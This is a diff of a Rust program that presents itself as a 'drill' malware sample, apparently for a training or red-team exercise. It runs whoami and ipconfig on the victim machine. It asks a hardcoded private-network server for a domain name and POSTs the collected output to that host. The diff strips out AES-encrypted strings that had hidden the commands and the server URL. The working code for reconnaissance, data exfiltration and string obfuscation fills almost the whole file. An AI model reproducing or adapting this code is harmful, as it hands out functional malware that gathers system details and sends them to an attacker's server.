@@ -1,7 +1,7 @@
 use reqwest;
 use serde::Serialize;
 use std::{process::Command};
-use magic_crypt::{MagicCryptTrait, new_magic_crypt, MagicCrypt256};
+//use magic_crypt::{MagicCryptTrait, new_magic_crypt, MagicCrypt256};
 //use std::ffi::CString;
 //use user32::MessageBoxA;
 //use winapi::um::winuser::{MB_OK, MB_ICONINFORMATION};
@@ -29,21 +29,20 @@ fn main() {
         MessageBoxA(None, s!("You executed a malware. But do NOT worry. It's a drill."), 
         s!("Warning"), MB_ICONINFORMATION | MB_OK);
     }
-    let cryptor = new_magic_crypt!("AAABBCCCDDDEEE", 256);
-    let output1 = run_command(&decrypt(&cryptor, "MPa/ngkRhP50Pkvrnc2V2A=="));  // whoami
-    let output2 = run_command(&decrypt(&cryptor, "DvIk7Vgl7YXTDwtrU/Lbng=="));  // ipconfig
-    let _result = make_command_request(&output1, &output2, &cryptor);
+    //let cryptor = new_magic_crypt!("AAABBBCCCDDDEEE", 256);
+    let output1 = run_command("whoami");
+    let output2 = run_command("ipconfig");
+    let _result = make_command_request(&output1, &output2);
 }
 
 #[tokio::main]
-async fn make_command_request(output1: &str, output2: &str, cryptor: &MagicCrypt256) -> reqwest::Result<()>{
+async fn make_command_request(output1: &str, output2: &str) -> reqwest::Result<()>{
     let data = Whoami {
         whoami: output1.to_string(),
         ipconfig: output2.to_string(),
     };
     let client = reqwest::Client::new();
-    let domain_name = client.get(&decrypt(&cryptor, 
-        "aNfzKgOgX2llD7DxfNxXTRvCJvaZhqvCNwnuKW4hvIYZit8xsONQHgxQXo/+1no7")).send().await?;  // http://10.0.2.15:8080/api/v4/domain
+    let domain_name = client.get("http://10.0.2.23:8080/api/v4/domain").send().await?;  // change this endpoint
     let domain_name = domain_name.text().await?;
     let url = format!("http://{}:8080/api/v5/whoami", domain_name);
     let response = client.post(url).json(&data).send().await?;
@@ -67,7 +66,9 @@ fn run_command(command: &str) -> String {
     String::from_utf8_lossy(&output.stdout).to_string()
 }
 
+/*
 fn decrypt(cryptor: &MagicCrypt256, encrypted: &str) -> String {
     // cryptor.encrypt_str_to_base64(encrypted)
     cryptor.decrypt_base64_to_string(encrypted).unwrap()
 }
+*/
